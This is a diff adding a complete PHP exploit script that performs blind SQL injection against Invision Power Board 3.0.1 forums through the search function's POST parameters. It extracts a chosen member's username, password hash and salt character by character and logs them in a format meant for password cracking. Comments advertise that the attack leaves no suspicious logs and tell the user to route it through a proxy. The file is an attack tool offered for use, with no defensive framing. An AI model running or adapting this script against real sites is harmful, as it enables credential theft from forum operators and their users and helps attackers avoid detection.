@@ -1,0 +1,524 @@
+<?php
+error_reporting(E_ALL);
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+// IPB 3.0.1 sql injection exploit
+// Version 1.0
+// written by Cryptovirus
+// http://de.crypt.in/
+// 31. january 2010
+//
+// FEATURES:
+// 1. Fetching algorithm optimized for speed
+// 2. Attack goes through $_POST, so no suspicious logs
+// 3. Pretesting saves time if IPB is not vulnerable
+// 4. curl extension autoloading
+// 5. log format compatible with passwordspro
+//
+// NB! This exploit is meant to be run as php CLI!
+// http://www.php.net/features.commandline
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+//=====================================================================
+$cli = php_sapi_name() === 'cli';
+//=====================================================================
+// Die, if executed from webserver
+//=====================================================================
+if(!$cli)
+{
+      echo "<html><head><title>Attention!</title></head>\n";
+      echo "<body><br /><br /><center>\n";
+      echo "<h1>Error!</h1>\n";
+      echo "This exploit is meant to be used as php CLI script!<br />\n";
+      echo "More information:<br />\n";
+      echo "<a href=\"http://www.google.com/search?hl=en&q=php+cli+windows\" target=\"_blank\">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n";
+      echo "This script will not run through a webserver.<br />\n";
+      echo "</center></body></html>\n";
+      exit;
+}
+//=====================================================================
+// Print the awesome de.crypt.in logo
+//=====================================================================
+echo "\n     _                             _     _       ";
+echo "\n  __| | ___   ___ _ __ _   _ _ __ | |_  (_)_ __  ";
+echo "\n / _` |/ _ \ / __| '__| | | | '_ \| __| | | '_ \ ";
+echo "\n| (_| |  __/| (__| |  | |_| | |_) | |_ _| | | | |";
+echo "\n \__,_|\___(_)___|_|   \__, | .__/ \__(_)_|_| |_|";
+echo "\n                       |___/|_|                  \n\n";
+//=====================================================================
+// Check if all command line arguments were passed
+//=====================================================================
+if(!isset($argv[1])||!isset($argv[2])||!isset($argv[3])){
+      echo "Usage: php ".$_SERVER['PHP_SELF']." <target> <userid> <option> [login] [password]\n";
+      echo "\n";
+      echo "NOTE: Login and password are optional, use for forums that require registration.\n";
+      echo "Options: 1 - Fetch username, 2 - Fetch password hash\n\n";
+      echo "Example: php ".$_SERVER['PHP_SELF']." http://ipb.com/board/ 1 1 foo bar\n";
+      die;
+}
+//=====================================================================
+// Set some important variables...
+//=====================================================================
+$topicname = '';
+$url = $argv[1];
+$chosen_id = $argv[2];
+$ch_option = $argv[3];
+if(isset($argv[4])){
+    if(isset($argv[5])){
+        $user_login = $argv[4];
+        $user_pass = $argv[5];
+    }
+    else{
+        echo "Error: Password not specified with username\n";
+        die;
+    }
+}
+# Proxy settings
+# Be sure to use proxy :)
+//$proxy_ip_port = '127.0.0.1:8118';
+//$proxy_user_password = 'someuser:somepassword';
+$outfile = './ipb_log.txt'; //Log file
+
+if(!extension_loaded('curl'))
+{
+   if(!dl('php_curl.dll'))
+   {
+      die("Curl extension not loaded!\n Fatal exit ...\n");
+   }
+   else
+   {
+      echo "Curl loading success\n";
+   }
+}
+//=====================================================================
+xecho("Target: $url\n");
+xecho("Testing target URL ... \n");
+test_target_url();
+xecho("Target URL seems to be valid\n");
+add_line("==========================================");
+add_line("Target: $url");
+if(isset($argv[4])){
+    login_to_forum($argv[4], $argv[5]);
+}
+$i = $chosen_id;
+echo "Fetching topics from ID $i\n";
+   if(!fetch_target_id($i))
+   {
+    echo "No topics found.\n";
+    fwrite(STDOUT, "Last ditch effort, enter topic: ");
+    $topicname = trim(fgets(STDIN));  
+   }
+    else echo "Topic found! Hacktime.\n";
+   
+// Check chosen option and proceed accordingly
+add_line("------------------------------------------");
+if($ch_option == 2){
+    $hash = get_hash($i);
+    $salt = get_salt($i);
+    $line = "$i:$hash:$salt";
+    add_line($line);
+    xecho("\n------------------------------------------\n");
+    xecho("User ID: $i\n");
+    xecho("Hash: $hash\n");
+    xecho("Salt: $salt");
+    xecho("\n------------------------------------------\n");
+}
+else if($ch_option == 1){
+    $uname = get_user($i);
+    $line = "The username for id $i is $uname";
+    add_line($line);
+    xecho("$uname");
+}
+xecho("\nQuestions and feedback - http://de.crypt.in/ \n");
+die(" \n");
+//////////////////////////////////////////////////////////////////////
+function login_to_forum($user, $pass)
+{
+   global $url;
+   $post = 'app=core&module=global&section=login&do=process&username='.$user.'&password='.$pass.'&rememberMe=1';
+   $buff = trim(make_post($url, $post, '', $url));
+   if(strpos($buff,'The login was successful!')>0){
+        xecho("Logged in.\n");
+   }
+   else{
+        xecho("Error: Unable to login.");
+        die;
+    }
+}
+//////////////////////////////////////////////////////////////////////
+function test_target_url()
+{
+   global $url;
+   
+   $post = 'app=core&module=search&section=search&do=quick_search&search_app=core&fromsearch=1&search_filter_app%5Ball%5D=1&content_title_only=1&search_term=test%2527';
+   $buff = trim(make_post($url, $post, '', $url));
+
+   if(strpos($buff,'Moved Permanently')>0)
+   {
+      die('Ivalid. Try adding trailing slash to url. Exiting ...');
+   }
+
+   if(strpos($buff,'No results found for')>0)
+   {
+      die('Target is patched? Exiting ...');
+   }
+}
+//////////////////////////////////////////////////////////////////////
+function fetch_target_id($id)
+{
+   global $url, $topicname;  
+   $post = 'app=core&module=search&do=user_posts&mid='.$id.'&view_by_title=1&search_filter_app%5Bforums%5D=1';
+   $buff = trim(make_post($url, $post, '', $url));
+   if(strpos($buff,'View result')>0){
+        $location = strpos($buff,'View result');
+        $start = strpos($buff,'>',$location)+1;
+        $end = strpos($buff,'</a>',$start);
+        $topicname = substr($buff,$start,($end-$start));
+        return true;
+    }
+   else return false;
+}
+///////////////////////////////////////////////////////////////////////
+function get_salt($id)
+{
+   $len = 5;
+   $out = '';
+   xecho("Finding salt ...\n");
+   for($i = 1; $i < $len + 1; $i ++)
+   {
+      $ch = get_saltchar($i, $id);
+      xecho("Got pos $i --> $ch\n");
+      $out .= "$ch";
+      xecho("Current salt: $out \n");
+   }
+   xecho("\nFinal salt for ID $id: $out\n\n");
+   return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_saltchar($pos, $id)
+{
+   global $prefix;
+   $char = '';
+   $min = 32;
+   $max = 128;
+   $pattern = 'm.member_id='.$id.' AND ORD(SUBSTR(m.members_pass_salt,'.$pos.',1))';
+   $curr = 0;
+   while(1)
+   {
+      $area = $max - $min;
+      if($area < 2 )
+      {
+         $post = $pattern . "=$max";
+         $eq = test_condition($post);
+         if($eq)
+         {
+            $char = chr($max);
+         }
+         else
+         {
+            $char = chr($min);
+         }
+         break;
+      }
+      
+      $half = intval(floor($area / 2));
+      $curr = $min + $half;
+      $post = $pattern . '%253e' . $curr;
+      $bigger = test_condition($post);
+      if($bigger)
+      {
+         $min = $curr;
+      }
+      else
+      {
+         $max = $curr;
+      }
+      xecho("Current test: $curr-$max-$min\n");
+   }
+   return $char;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hash($id)
+{
+   $len = 32;
+   $out = '';
+   xecho("Finding hash ...\n");
+   for($i = 1; $i < $len + 1; $i ++)
+   {
+      $ch = get_hashchar($i, $id);
+      xecho("Got pos $i --> $ch\n");
+      $out .= "$ch";
+      xecho("Current hash: $out \n");
+   }
+   xecho("\nFinal hash for ID $id: $out\n\n");
+   return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hashchar($pos, $id)
+{
+   global $prefix;
+   $char = '';
+   $pattern = 'm.member_id='.$id.' AND ORD(SUBSTR(m.members_pass_hash,'.$pos.',1))';
+   // First let's determine, if it's number or letter
+   $post = $pattern . '%253e57';
+   $letter = test_condition($post);
+   if($letter)
+   {
+      $min = 97;
+      $max = 102;
+      xecho("Char to find is [a-f]\n");
+   }
+   else
+   {
+      $min = 48;
+      $max = 57;
+      xecho("Char to find is [0-9]\n");
+   }
+   $curr = 0;
+   while(1)
+   {
+      $area = $max - $min;
+      if($area < 2 )
+      {
+         $post = $pattern . "=$max";
+         $eq = test_condition($post);
+         if($eq)
+         {
+            $char = chr($max);
+         }
+         else
+         {
+            $char = chr($min);
+         }
+         break;
+      }
+      
+      $half = intval(floor($area / 2));
+      $curr = $min + $half;
+      $post = $pattern . '%253e' . $curr;
+      $bigger = test_condition($post);
+      if($bigger)
+      {
+         $min = $curr;
+      }
+      else
+      {
+         $max = $curr;
+      }
+      xecho("Current test: $curr-$max-$min\n");
+   }
+   return $char;
+}
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+function get_user($id)
+{
+   $len = 32;
+   $out = '';
+   
+   xecho("Finding username ...\n");
+   
+   for($i = 1; $i < $len + 1; $i ++)
+   {
+      $ch = get_userchar($i, $id);
+      xecho("Got pos $i --> $ch\n");
+      $out .= "$ch";
+      xecho("Current username: $out \n");
+   }
+   
+   xecho("\nFinal username for ID $id: $out\n\n");
+   
+   return $out;
+}
+///////////////////////////////////////////////////////////////////////
+function get_userchar($pos, $id)
+{
+   global $prefix;
+
+   $char = '';
+   $pattern = 'm.member_id='.$id.' AND ORD(SUBSTR(m.name,'.$pos.',1))';
+
+   // First let's determine, if it's number or letter
+   $post = $pattern . '%253e57';
+   $letter = test_condition($post);
+   
+   if($letter)
+   {
+      $min = 65;
+      $max = 122;
+      xecho("Char to find is [a-f]\n");
+   }
+   else
+   {
+      $min = 48;
+      $max = 57;
+      xecho("Char to find is [0-9]\n");
+   }
+
+   $curr = 0;
+   
+   while(1)
+   {
+      $area = $max - $min;
+      if($area < 2 )
+      {
+         $post = $pattern . "=$max";
+         $eq = test_condition($post);
+         
+         if($eq)
+         {
+            $char = chr($max);
+         }
+         else
+         {
+            $char = chr($min);
+         }
+         
+         break;
+      }
+      
+      $half = intval(floor($area / 2));
+      $curr = $min + $half;
+      
+      $post = $pattern . '%253e' . $curr;
+      
+      $bigger = test_condition($post);
+      
+      if($bigger)
+      {
+         $min = $curr;
+      }
+      else
+      {
+         $max = $curr;
+      }
+
+      xecho("Current test: $curr-$max-$min\n");
+   }
+   
+   return $char;
+}
+///////////////////////////////////////////////////////////////////////
+function test_condition($p)
+{
+   global $url;
+   global $topicname;
+   
+   $bret = false;
+   $maxtry = 10;
+   $try = 1;
+      
+   $pattern = 'app=core&module=search&section=search&do=quick_search&search_app=core&fromsearch=1&search_filter_app%%5Ball%%5D=1&content_title_only=1&search_term='.$topicname.'%%2527 IN BOOLEAN MODE) AND %s AND MATCH(t.title) AGAINST(%%2527'.$topicname;
+   $post = sprintf($pattern, $p);
+
+   while(1)
+   {
+      $buff = trim(make_post($url, $post, '', $url));
+
+      if(strpos($buff,'Your search for the term <em><strong>')>0)
+      {
+         $bret = true;
+         break;
+      }
+      elseif(strpos($buff,'No results found for')>0)
+      {
+         break;
+      }
+      elseif(strpos($buff, 'Driver Error</title>') !== false)
+      {
+         die("Sql error! Wrong prefix?\nExiting ... ");
+      }
+      else
+      {
+         xecho("test_condition() - try $try - invalid return value ...\n");
+         xecho("Will wait 30 seconds for flood control. Expect 2-3 tries.\n");
+         xecho("This is going to take years...\n");
+         sleep(10);
+         $try ++;
+         if($try > $maxtry)
+         {
+            die("Too many tries - exiting ...\n");
+         }
+         else
+         {
+            xecho("Trying again - try $try ...\n");
+         }
+      }
+   }
+   
+   return $bret;
+}
+///////////////////////////////////////////////////////////////////////
+function make_post($url, $post_fields='', $cookie = '', $referer = '', $headers = FALSE)
+{
+   $ch = curl_init();
+   $timeout = 120;
+   curl_setopt ($ch, CURLOPT_URL, $url);
+   curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+   curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+   curl_setopt($ch, CURLOPT_POST, 1);
+   curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+   curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)');
+   curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
+   curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
+
+   
+   if(!empty($GLOBALS['proxy_ip_port']))
+   {
+      curl_setopt($ch, CURLOPT_PROXY, $GLOBALS['proxy_ip_port']);
+      
+      if(!empty($GLOBALS['proxy_user_password']))
+      {
+         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS['proxy_user_password']);
+      }
+   }
+   
+   if(!empty($cookie))
+   {
+      curl_setopt ($ch, CURLOPT_COOKIE, $cookie);
+   }
+ 
+   if(!empty($referer))
+   {
+      curl_setopt ($ch, CURLOPT_REFERER, $referer);
+   }
+
+   if($headers === TRUE)
+   {
+      curl_setopt ($ch, CURLOPT_HEADER, TRUE);
+   }
+   else
+   {
+      curl_setopt ($ch, CURLOPT_HEADER, FALSE);
+   }
+   
+   $fc = curl_exec($ch);
+   curl_close($ch);
+   
+   return $fc;
+}
+///////////////////////////////////////////////////////////////////////
+function add_line($line)
+{
+   global $outfile;
+   $line .= "\r\n";
+   $fh = fopen($outfile, 'ab');
+   fwrite($fh, $line);
+   fclose($fh);
+}
+///////////////////////////////////////////////////////////////////////
+function xecho($line)
+{
+   if($GLOBALS['cli'])
+   {
+      echo "$line";
+   }
+   else
+   {
+      $line = nl2br(htmlspecialchars($line));
+      echo "$line";
+   }
+}
+///////////////////////////////////////////////////////////////////////
+?>
